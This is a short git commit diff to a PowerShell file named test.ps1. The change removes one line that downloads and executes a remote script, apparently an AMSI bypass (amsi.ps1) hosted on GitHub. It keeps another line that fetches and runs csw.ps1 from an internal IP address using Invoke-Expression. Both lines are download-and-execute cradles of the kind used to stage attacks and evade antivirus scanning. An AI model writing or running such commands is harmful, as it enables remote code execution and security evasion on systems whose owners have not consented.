10048ac21af90e0b209d05e5d0b10cd635795145
watto33 <38833570+watto33@users.noreply.github.com>
2022-07-20 13:13:57 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,2 +1,1 @@
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/watto33/temp/main/amsi.ps1')
 iex(new-object net.webclient).downloadstring('http://192.168.240.60/csw.ps1')
